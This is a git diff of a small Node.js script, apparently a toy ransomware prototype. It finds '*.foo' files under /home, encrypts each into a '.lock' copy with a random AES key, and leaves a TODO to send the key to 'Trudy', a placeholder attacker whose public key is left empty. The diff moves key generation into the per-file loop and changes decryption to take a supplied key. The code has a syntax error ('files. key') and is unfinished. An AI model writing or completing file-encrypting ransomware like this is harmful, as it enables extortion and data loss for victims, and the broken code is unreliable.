@@ -4,9 +4,8 @@ var fileStream = require('fs');
 var publicKeyTrudy = ;
 
 var crypto = require('crypto'),
-algorithm = 'aes-256-ctr',
-password = secureRandom(64);
-console.log(password);
+algorithm = 'aes-256-ctr'
+//console.log(password);
 
 var files = fileFinder.from('/home').findFiles('*.foo');
 var encryptedFiles = [];
@@ -27,6 +26,8 @@ function decrypt(text){
 
 function encryptFiles(files){
 	files.forEach(function(file) {
+   var password = secureRandom(64);
+   //TODO MAKE the CALL TO TRUDY
    var cipher = crypto.createCipher(algorithm,password);
    var input = fileStream.createReadStream(file);
    var output = fileStream.createWriteStream(file +'.lock');
@@ -35,9 +36,9 @@ function encryptFiles(files){
  });
 }
 
-function deCryptFiles(files){
+function deCryptFiles(files. key){
 	files.forEach(function(file) {
-   var deCipher = crypto.createDecipher(algorithm,password);
+   var deCipher = crypto.createDecipher(algorithm, key);
    var input = fileStream.createReadStream(file);
    var output = fileStream.createWriteStream(file.slice(0, -5));
    input.pipe(deCipher).pipe(output);
